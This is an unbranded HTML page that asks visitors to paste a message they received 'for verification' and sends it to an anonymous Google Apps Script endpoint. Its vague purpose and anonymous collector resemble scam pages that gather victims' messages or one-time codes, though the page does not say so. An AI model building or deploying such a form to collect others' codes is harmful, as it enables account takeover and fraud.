<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Message Verification</title>

<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap" rel="stylesheet">

<style>
:root{
  --primary:#0b3a66;
  --bg:#f3f5f8;
  --card:#fff;
  --border:#e5e7eb;
}

*{box-sizing:border-box}

body{
  margin:0;
  min-height:100vh;
  font-family:Inter,system-ui,sans-serif;
  background:var(--bg);
  display:flex;
  flex-direction:column;
  opacity:0;
  transition:.5s;
}
body.fade-in{opacity:1}
body.fade-out{opacity:0}

main{
  flex:1;
  display:flex;
  align-items:center;
  justify-content:center;
  padding:40px 20px;
}

.card{
  width:100%;
  max-width:520px;
  background:var(--card);
  border-radius:14px;
  border:1px solid var(--border);
  box-shadow:0 12px 30px rgba(0,0,0,.12);
}

.card-header{
  padding:22px 26px;
  border-bottom:1px solid var(--border);
}

.card-body{padding:26px}

label{
  font-size:13px;
  font-weight:600;
  display:block;
  margin-bottom:6px;
}

textarea{
  width:100%;
  min-height:160px;
  padding:12px 14px;
  border-radius:8px;
  border:1px solid var(--border);
  resize:vertical;
  margin-bottom:18px;
}

button{
  width:100%;
  padding:14px;
  border:none;
  border-radius:10px;
  background:var(--primary);
  color:#fff;
  font-weight:600;
  cursor:pointer;
}

.overlay{
  position:fixed;
  inset:0;
  background:rgba(0,0,0,.45);
  display:flex;
  align-items:center;
  justify-content:center;
  flex-direction:column;
  color:#fff;
  opacity:0;
  pointer-events:none;
  transition:.3s;
}
.overlay.active{opacity:1;pointer-events:all}

.spinner{
  width:44px;
  height:44px;
  border:4px solid rgba(255,255,255,.3);
  border-top:4px solid #ffcc00;
  border-radius:50%;
  animation:spin 1s linear infinite;
  margin-bottom:14px;
}
@keyframes spin{to{transform:rotate(360deg)}}
</style>
</head>

<body>
<script>document.body.classList.add("fade-in")</script>

<main>
  <div class="card">
    <div class="card-header">
      <h2>Verify Received Message</h2>
      <p>Paste the message you received for review.</p>
    </div>

    <div class="card-body">
      <form id="verifyForm">
        <label>Paste Received Message For Verification</label>
        <textarea name="message" required></textarea>
        <button type="submit">Submit for Verification</button>
      </form>
    </div>
  </div>
</main>

<div class="overlay" id="overlay">
  <div class="spinner"></div>
  Submitting message…
</div>

<script>
const form = document.getElementById("verifyForm");
const overlay = document.getElementById("overlay");

const SCRIPT_URL = "https://script.google.com/macros/s/AKfycbwrIGl6QRyWqn8VzPQ_VZZmJiJClkZoA2AK7UGG5J9UuljuD71HXidepO19tWfc1WRDNQ/exec";

form.addEventListener("submit", async e => {
  e.preventDefault();
  overlay.classList.add("active");

  const formData = new FormData(form);

  try {
    const res = await fetch(SCRIPT_URL, {
      method: "POST",
      body: formData
    });

    const text = await res.text();

    if (text.toLowerCase().includes("success")) {
      setTimeout(() => {
        document.body.classList.add("fade-out");
        setTimeout(() => {
          alert("Message submitted successfully ✔️");
          location.reload();
        }, 500);
      }, 1000);
    } else {
      throw new Error("Submission failed");
    }

  } catch (err) {
    overlay.classList.remove("active");
    alert("Error submitting message. Try again.");
  }
});
</script>

</body>
</html>
